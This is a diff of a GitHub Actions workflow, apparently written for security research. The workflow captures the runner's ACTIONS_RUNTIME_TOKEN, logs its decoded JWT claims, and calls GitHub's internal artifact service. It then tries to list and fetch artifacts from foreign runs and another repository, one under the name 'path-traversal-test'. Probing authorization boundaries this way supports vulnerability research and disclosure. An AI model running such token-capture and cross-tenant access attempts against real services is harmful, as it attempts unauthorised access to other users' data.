@@ -1,46 +1,64 @@
-name: Artifact Token Capture
+name: Artifact API Deep Test
 on:
   workflow_dispatch:
 permissions:
   contents: read
   actions: read
 jobs:
-  capture:
+  test:
     runs-on: ubuntu-latest
     steps:
-      - name: Create test file
-        run: echo "artifact-test-data" > /tmp/test-artifact.txt
+      - run: echo "test-data-$(date +%s)" > /tmp/art.txt
       - uses: actions/upload-artifact@v4
         with:
-          name: token-capture
-          path: /tmp/test-artifact.txt
+          name: deep-test-artifact
+          path: /tmp/art.txt
       - uses: actions/github-script@v7
         with:
           script: |
             const env = process.env;
             const token = env.ACTIONS_RUNTIME_TOKEN;
-            if (!token) { console.log('NO TOKEN'); return; }
-            
-            // Decode FULL JWT including scp
-            const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString());
-            console.log('=== FULL JWT payload (post-artifact-upload) ===');
-            console.log(JSON.stringify(payload, null, 2));
-            
-            // Now try the artifact service with this token
             const resultsUrl = env.ACTIONS_RESULTS_URL;
-            if (!resultsUrl) { console.log('NO RESULTS URL'); return; }
-            
             const headers = { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' };
             const artBase = `${resultsUrl}twirp/github.actions.results.api.v1.ArtifactService`;
             
-            console.log('\n=== ListArtifacts ===');
-            const r1 = await fetch(`${artBase}/ListArtifacts`, {
-              method: 'POST', headers, body: JSON.stringify({})
-            });
-            console.log(`${r1.status}: ${(await r1.text()).substring(0, 300)}`);
+            // Decode JWT for run/job IDs
+            const jwt = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString());
+            console.log(`run_id: ${jwt.run_id}, job_id: ${jwt.job_id}, orch_id: ${jwt.orch_id}`);
+            console.log(`scp: ${jwt.scp}`);
             
-            console.log('\n=== GetSignedArtifactURL ===');
-            const r2 = await fetch(`${artBase}/GetSignedArtifactURL`, {
-              method: 'POST', headers, body: JSON.stringify({name: 'token-capture'})
+            // ListArtifacts with proper parameters
+            console.log('\n=== ListArtifacts with workflow_run_backend_id ===');
+            const r1 = await fetch(`${artBase}/ListArtifacts`, {
+              method: 'POST', headers,
+              body: JSON.stringify({workflow_run_backend_id: jwt.orch_id.split('.')[0], workflow_job_run_backend_id: jwt.job_id})
             });
-            console.log(`${r2.status}: ${(await r2.text()).substring(0, 300)}`);
+            console.log(`${r1.status}: ${(await r1.text()).substring(0, 500)}`);
+            
+            // GetSignedArtifactURL with proper params
+            console.log('\n=== GetSignedArtifactURL with name ===');
+            const r2 = await fetch(`${artBase}/GetSignedArtifactURL`, {
+              method: 'POST', headers,
+              body: JSON.stringify({name: 'deep-test-artifact', workflow_run_backend_id: jwt.orch_id.split('.')[0], workflow_job_run_backend_id: jwt.job_id})
+            });
+            console.log(`${r2.status}: ${(await r2.text()).substring(0, 500)}`);
+            
+            // CROSS-RUN TEST: Try to access artifacts from a DIFFERENT run
+            console.log('\n=== Cross-run: ListArtifacts with FOREIGN run ID ===');
+            const r3 = await fetch(`${artBase}/ListArtifacts`, {
+              method: 'POST', headers,
+              body: JSON.stringify({workflow_run_backend_id: '00000000-0000-0000-0000-000000000001', workflow_job_run_backend_id: '00000000-0000-0000-0000-000000000001'})
+            });
+            console.log(`${r3.status}: ${(await r3.text()).substring(0, 300)}`);
+            
+            // CROSS-REPO TEST: Try with a different repo's artifact
+            console.log('\n=== Cross-repo: GetSignedArtifactURL with foreign context ===');
+            const r4 = await fetch(`${artBase}/GetSignedArtifactURL`, {
+              method: 'POST', headers,
+              body: JSON.stringify({
+                name: 'path-traversal-test',
+                workflow_run_backend_id: '28322121976',
+                workflow_job_run_backend_id: jwt.job_id
+              })
+            });
+            console.log(`${r4.status}: ${(await r4.text()).substring(0, 300)}`);
